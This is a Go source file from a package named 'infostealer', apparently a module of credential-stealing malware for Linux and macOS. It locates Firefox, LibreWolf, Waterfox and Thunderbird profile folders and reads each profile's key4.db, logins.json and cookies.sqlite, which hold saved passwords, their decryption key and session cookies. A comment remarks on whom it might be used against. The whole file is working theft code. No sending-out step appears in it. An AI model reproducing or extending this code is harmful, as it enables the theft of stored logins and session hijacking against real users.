//go:build linux || darwin

package infostealer

import (
	"os"
	"path/filepath"
	"runtime"
)

type supportedGeckoBrowsers []struct {
	Name string
	Path string
}

var linuxGeckoBrowsers = supportedGeckoBrowsers{
	{"Firefox (Standard)", filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox")},
	{"Firefox (Snap)", filepath.Join(os.Getenv("HOME"), "snap", "firefox", "common", ".mozilla", "firefox")},
	{"Firefox (Flatpak)", filepath.Join(os.Getenv("HOME"), ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox")},
	{"LibreWolf", filepath.Join(os.Getenv("HOME"), ".librewolf")},
	{"Waterfox", filepath.Join(os.Getenv("HOME"), ".waterfox")},
	{"Thunderbird", filepath.Join(os.Getenv("HOME"), ".thunderbird")},
}

var macGeckoBrowsers = supportedGeckoBrowsers{
	{"Firefox", filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Firefox")},
	{"LibreWolf", filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "LibreWolf")},
	{"Waterfox", filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Waterfox")},
	{"Thunderbird", filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Thunderbird")},
}

func getSupportedPlatforms() supportedGeckoBrowsers {
	switch runtime.GOOS {
	case "linux":
		return linuxGeckoBrowsers
	case "darwin":
		return macGeckoBrowsers
	default:
		return nil //dear go compiler: who is gonna use this against a bsd host
	}
}

type geckoProfile struct {
	Name    string
	Key4DB  []byte
	Cookies []byte
	Logins  []byte
}

type GeckoBrowser struct {
	Name      string
	Localpath string
	Profiles  []geckoProfile
}

func (browsers *supportedGeckoBrowsers) detectBrowsers() []GeckoBrowser {
	var detectedbrowsers []GeckoBrowser
	for _, browser := range *browsers {
		_, err := os.Stat(browser.Path)
		if err == nil {
			detectedbrowsers = append(detectedbrowsers, GeckoBrowser{
				Name:      browser.Name,
				Localpath: browser.Path,
			})
		}
	}
	return detectedbrowsers
}

func (browser *GeckoBrowser) getProfiles() {
	folder, _ := os.ReadDir(browser.Localpath)
	for _, subdir := range folder {
		if !subdir.IsDir() {
			continue
		}
		subdirRead, _ := os.ReadDir(filepath.Join(browser.Localpath, subdir.Name()))
		for _, file := range subdirRead {
			if file.Name() == "key4.db" {
				browser.Profiles = append(browser.Profiles, geckoProfile{
					Name: subdir.Name(),
				})
			}
		}
	}
}

func (browser *GeckoBrowser) getData() {
	for i, profile := range browser.Profiles {
		profiledir := filepath.Join(browser.Localpath, profile.Name)
		browser.Profiles[i].Key4DB, _ = os.ReadFile(filepath.Join(profiledir, "key4.db"))
		browser.Profiles[i].Logins, _ = os.ReadFile(filepath.Join(profiledir, "logins.json"))
		browser.Profiles[i].Cookies, _ = os.ReadFile(filepath.Join(profiledir, "cookies.sqlite"))
	}
}

func Firefox() []GeckoBrowser {
	supportedBrowsers := getSupportedPlatforms()
	detectedBrowsers := supportedBrowsers.detectBrowsers()
	for i, _ := range detectedBrowsers {
		detectedBrowsers[i].getProfiles()
		detectedBrowsers[i].getData()
	}
	return detectedBrowsers
}
